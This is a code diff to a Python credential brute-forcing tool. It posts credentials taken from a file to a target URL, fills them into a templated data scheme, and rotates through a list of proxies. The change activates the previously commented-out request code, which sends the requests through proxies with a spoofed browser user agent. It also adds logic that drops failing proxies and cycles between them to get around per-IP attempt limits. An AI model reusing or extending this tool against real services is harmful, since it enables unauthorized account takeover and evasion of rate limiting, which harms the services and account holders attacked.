@@ -107,7 +107,7 @@ class Bruteforcer:
                         )
                     else:
                         print(
-                            "Dopasuj liczbę danych wejściowych do liczby zmiennych w pliku txt"
+                            "Match the number of columns in credential file to the number of variables in the text file with API data scheme"
                         )
                         sys.exit(-1)
                 else:
@@ -120,7 +120,7 @@ class Bruteforcer:
             self.data_scheme = data_scheme_file.read().rstrip()
             if is_empty(self.data_scheme, data_scheme_file_raw):
                 sys.exit(-1)
-        print(len(re.findall("\$\{(\w)+}", self.data_scheme)))
+        # print(len(re.findall("\$\{(\w)+}", self.data_scheme)))
         with open(credentials_file_raw) as credentials_file:
             credentials_list = credentials_file.readlines()
             if is_empty(credentials_list, credentials_file_raw):
@@ -134,7 +134,6 @@ class Bruteforcer:
         if proxies_file_raw:
             with open(proxies_file_raw) as proxies_file:
                 self.proxies = [line.rstrip() for line in proxies_file if line.strip()]
-                print(self.proxies)
                 if self.attemps_per_ip * len(self.proxies) < len(self.credentials_list):
                     # warning
                     print(
@@ -150,6 +149,25 @@ class Bruteforcer:
             self.proxies = []
 
     def perform_bruteforce(self):
+        def control_the_proxy_rotation(index, data_to_post):
+            try:
+                self.proxy_rotating_injection(index, str.encode(data_to_post))
+            except urllib.error.HTTPError as HTTPe:
+                print(f"Exception: {HTTPe}")
+            except urllib.error.URLError as URLe:
+                old_size_proxy_list = len(set(self.proxies)) - 1
+                print(f"Exception: `{URLe}`")
+                self.proxies = [i for i in self.proxies if i != self.proxies[index]]
+                print(self.proxies)
+                if index != old_size_proxy_list:
+                    index = index + 1
+                else:
+                    index = 0
+                    # recursion
+                    print(f"NEW INDEX {index}")
+                    control_the_proxy_rotation(index, data_to_post)
+            return index
+
         counter = 0
         index = 0
         for credentials in self.credentials_list:
@@ -160,29 +178,33 @@ class Bruteforcer:
                 )
             if self.proxies:
                 if counter < self.attemps_per_ip:
-                    self.proxy_rotating_injection(index, str.encode(data_to_post))
+                    index = control_the_proxy_rotation(index, data_to_post)
                     # TODO
                     # jeśli się uda to git
                     # jeśli nie to zmień IP na następny
                     counter = counter + 1
                 else:
-                    index = index + 1
+                    if index != len(set(self.proxies)) - 1:
+                        index = index + 1
+                    else:
+                        index = 0
                     counter = 0
             else:
                 self.standard_injection(str.encode(data_to_post))
         pass
 
     def proxy_rotating_injection(self, index, data_bytes):
+        print(index)
         print(f"IP: `{self.proxies[index]}`, Data: `{data_bytes}`")
-        # proxy_handler = urllib.request.ProxyHandler(
-        #     {"http": self.proxies[index], "https": self.proxies[index]}
-        # )
-        # opener = urllib.request.build_opener(proxy_handler)
-        # opener.addheaders = [("User-agent", "Mozilla/5.0")]
-        # urllib.request.install_opener(opener)
-        # request = urllib.request.Request(self.url, data=data_bytes)
-        # with urllib.request.urlopen(request, timeout=10) as response:
-        #     print(response.status)
+        proxy_handler = urllib.request.ProxyHandler(
+            {"http": self.proxies[index], "https": self.proxies[index]}
+        )
+        opener = urllib.request.build_opener(proxy_handler)
+        opener.addheaders = [("User-agent", "Mozilla/5.0")]
+        urllib.request.install_opener(opener)
+        request = urllib.request.Request(self.url, data=data_bytes)
+        with urllib.request.urlopen(request, timeout=10) as response:
+            print(response.status)
 
     def standard_injection(self, data_bytes):
         print(f"IP: Your IP, Data: `{data_bytes}`")
@@ -213,7 +235,6 @@ parser = argparse.ArgumentParser()
 args = collect_input_args(parser)
 validate_input_args(args)
 
-print(args.proxies)
 bruteforce_tool = Bruteforcer(
     args.url, args.data_scheme, args.credentials_file, args.proxies, args.attemps_per_ip
 )
